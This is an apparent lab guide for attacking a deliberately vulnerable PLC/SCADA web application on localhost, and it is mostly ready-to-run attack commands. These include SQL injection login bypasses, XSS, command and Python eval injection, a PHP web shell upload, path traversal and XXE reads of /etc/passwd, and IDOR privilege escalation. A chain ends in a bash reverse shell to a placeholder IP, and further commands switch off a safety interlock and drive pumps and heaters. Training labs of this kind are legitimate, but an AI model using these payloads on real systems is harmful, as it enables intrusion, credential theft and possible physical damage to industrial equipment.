# Complete Vulnerabilities Testing Guide

## SQL Injection (FIXED & WORKING)

### Test 1: Basic SQL Injection Login Bypass

```bash
# Method 1: Classic OR bypass
Username: admin' OR '1'='1
Password: anything

# Method 2: Comment out password check
Username: admin'--
Password: (leave empty)

# Method 3: Always true condition
Username: ' OR ''='
Password: ' OR ''='

# Method 4: UNION attack
Username: ' UNION SELECT 1,'admin','pwd','admin'--
Password: anything
```

### Test with curl:
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1&password=x" \
  -v
```

**Watch the terminal** - SQL queries are now logged for debugging!

---

## Cross-Site Scripting (XSS)

### Reflected XSS
```bash
# Test endpoint
http://localhost:5000/api/search?q=<script>alert('XSS')</script>

# Or with curl
curl "http://localhost:5000/api/search?q=<script>alert(1)</script>"
```

### Stored XSS
```bash
# 1. Login first
curl -X POST http://localhost:5000/login \
  -d "username=admin&password=admin" \
  -c cookies.txt

# 2. Post malicious comment
curl -X POST http://localhost:5000/api/comment \
  -b cookies.txt \
  -d "comment=<script>alert('Stored XSS')</script>"

# 3. View comments (XSS will execute)
curl http://localhost:5000/api/comments
```

---

## Command Injection

### Via Admin Panel
1. Login as admin
2. Go to `/admin/system`
3. Execute commands:
```bash
ls -la
cat /etc/passwd
whoami
id
```

### Via API Endpoints

**Ping Command Injection:**
```bash
curl "http://localhost:5000/api/ping?host=127.0.0.1;cat%20/etc/passwd"
curl "http://localhost:5000/api/ping?host=8.8.8.8%26%26whoami"
```

**Admin Exec (requires admin):**
```bash
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=cat /etc/passwd"
```

---

## File Upload Vulnerability

```bash
# Create malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload (requires operator/admin)
curl -X POST http://localhost:5000/api/upload \
  -b cookies.txt \
  -F "file=@shell.php"

# Access uploaded file
curl http://localhost:5000/uploads/shell.php?cmd=whoami
```

---

## Directory Traversal

### Path Traversal in /backup
```bash
# Read /etc/passwd
curl http://localhost:5000/backup/../../../etc/passwd

# Read application files
curl http://localhost:5000/backup/app.py
curl http://localhost:5000/backup/plc.db

# Windows (if applicable)
curl http://localhost:5000/backup/../../../../windows/system32/drivers/etc/hosts
```

### Path Traversal in /api/download
```bash
curl http://localhost:5000/api/download/../../../etc/passwd
curl http://localhost:5000/api/download/app.py
```

---

## Insecure Direct Object Reference (IDOR)

### View Other Users
```bash
# Login as guest
curl -X POST http://localhost:5000/login \
  -d "username=guest&password=guest" \
  -c cookies.txt

# View admin user (user_id=1)
curl http://localhost:5000/api/user/1 -b cookies.txt

# View all users by ID
curl http://localhost:5000/api/user/2 -b cookies.txt
curl http://localhost:5000/api/user/3 -b cookies.txt
```

### Modify User Roles (Privilege Escalation)
```bash
# As guest, escalate yourself to admin
curl -X POST http://localhost:5000/api/modify_user \
  -b cookies.txt \
  -d "user_id=3&role=admin"

# Logout and login again - you're now admin!
```

---

## Information Disclosure

### Debug Endpoint
```bash
curl http://localhost:5000/debug | jq

# Returns:
# - Session data
# - Environment variables
# - Secret key
# - Debug mode status
```

### API Keys Exposure
```bash
curl http://localhost:5000/api/keys

# Returns:
# - api_key
# - secret_token
# - database_path
# - Flask secret_key
```

---

## Code Injection

### Python eval() (Admin only)
```bash
# Login as admin first
curl -X POST http://localhost:5000/login \
  -d "username=admin&password=admin" \
  -c cookies.txt

# Execute Python code
curl -X POST http://localhost:5000/api/eval \
  -b cookies.txt \
  -d "code=1+1"

curl -X POST http://localhost:5000/api/eval \
  -b cookies.txt \
  -d "code=__import__('os').system('whoami')"

curl -X POST http://localhost:5000/api/eval \
  -b cookies.txt \
  -d "code=open('/etc/passwd').read()"
```

---

## XML External Entity (XXE)

```bash
# Basic XXE to read files
curl -X POST http://localhost:5000/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'

# XXE to read application files
curl -X POST http://localhost:5000/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///home/taimaishu/vulnerable_plc/app.py">
]>
<root>&xxe;</root>'
```

---

## Unauthenticated Access

### Modbus Raw API (No Auth Required)
```bash
# Control equipment without authentication
curl -X POST http://localhost:5000/api/modbus/raw \
  -d "register=1&value=9999"

# No login needed!
```

---

## Complete Equipment Control Map

### All Controllable Equipment via API

```bash
# Login as operator or admin first
curl -X POST http://localhost:5000/login \
  -d "username=operator&password=operator123" \
  -c cookies.txt

# Control Pumps
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"pump1_status","value":true}'

curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"pump1_speed","value":2500}'

# Control Valves
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"valve1_status","value":true}'

# Control Motors
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"motor1_speed","value":3000}'

# Control Heater
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"heater1_status","value":true}'

# Control Cooler
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"cooler1_status","value":false}'

# Control Conveyor
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"conveyor_status","value":true}'

curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"conveyor_speed","value":75}'

# Emergency Stop
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"emergency_stop","value":true}'

# Safety Interlock
curl -X POST http://localhost:5000/api/process/control \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"action":"safety_interlock","value":false}'
```

---

## Metasploit Testing

### Modbus Enumeration
```bash
msfconsole

use auxiliary/scanner/scada/modbusdetect
set RHOSTS localhost
set RPORT 5502
run

use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS localhost
set RPORT 5502
run
```

### HTTP Exploitation
```bash
# SQL Injection detection
use auxiliary/scanner/http/sql_injection
set RHOSTS localhost
set RPORT 5000
set URI /login
run

# Directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS localhost
set RPORT 5000
run

# File upload scanner
use auxiliary/scanner/http/files_dir
set RHOSTS localhost
set RPORT 5000
run
```

---

## Automated Scanning

### SQLMap
```bash
# SQL injection in login
sqlmap -u "http://localhost:5000/login" \
  --data "username=admin&password=admin" \
  --method POST \
  --level=5 \
  --risk=3 \
  --batch

# Dump database
sqlmap -u "http://localhost:5000/login" \
  --data "username=admin&password=admin" \
  --method POST \
  --dump
```

### Nikto
```bash
nikto -h http://localhost:5000
```

### OWASP ZAP
```bash
# Use GUI or command line
zap-cli quick-scan -s all http://localhost:5000
```

---

## Full Exploitation Chain

### Scenario: Guest to Root

```bash
# 1. Start as guest (no privileges)
curl -X POST http://localhost:5000/login \
  -d "username=guest&password=guest" \
  -c cookies.txt

# 2. Information gathering
curl http://localhost:5000/debug | jq
curl http://localhost:5000/api/keys

# 3. Privilege escalation via IDOR
curl -X POST http://localhost:5000/api/modify_user \
  -b cookies.txt \
  -d "user_id=3&role=admin"

# 4. Logout and re-login
curl http://localhost:5000/logout
curl -X POST http://localhost:5000/login \
  -d "username=guest&password=guest" \
  -c cookies.txt

# 5. Now you're admin - execute commands
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=whoami"

# 6. Get reverse shell
curl -X POST http://localhost:5000/admin/exec \
  -b cookies.txt \
  -d "command=bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
```

---

## Testing Checklist

- [ ] SQL Injection login bypass
- [ ] Reflected XSS
- [ ] Stored XSS
- [ ] Command injection (ping)
- [ ] Command injection (admin panel)
- [ ] File upload
- [ ] Directory traversal (/backup)
- [ ] Directory traversal (/api/download)
- [ ] IDOR (view users)
- [ ] IDOR (modify users)
- [ ] Information disclosure (/debug)
- [ ] API keys exposure (/api/keys)
- [ ] Code injection (eval)
- [ ] XXE injection
- [ ] Unauthenticated Modbus control
- [ ] Process control escalation
- [ ] Session hijacking
- [ ] CSRF attacks

---

## New Equipment Available

**Tanks:**
- Tank 1 (Main) - level, temp, pressure
- Tank 2 (Secondary) - level, temp, pressure

**Pumps:**
- Pump 1 - on/off, speed control
- Pump 2 - on/off, speed control
- Pump 3 - on/off

**Valves:**
- Valve 1 (Main Inlet) - open/close
- Valve 2 (Main Outlet) - open/close
- Valve 3 (Emergency Relief) - open/close
- Valve 4 (Bypass) - open/close

**Motors:**
- Motor 1 - speed control
- Motor 2 - speed control

**Temperature Control:**
- Heater 1 - on/off, setpoint
- Cooler 1 - on/off, setpoint

**Conveyor:**
- Status - on/off
- Speed - 0-100

**Safety:**
- Emergency Stop - activate/deactivate
- Safety Interlock - enable/disable

**Sensors:**
- Flow rate
- Vibration
- pH level
- Conductivity

All visible on HMI and controllable via Modbus!

---

**Remember: For Educational Purposes Only!**
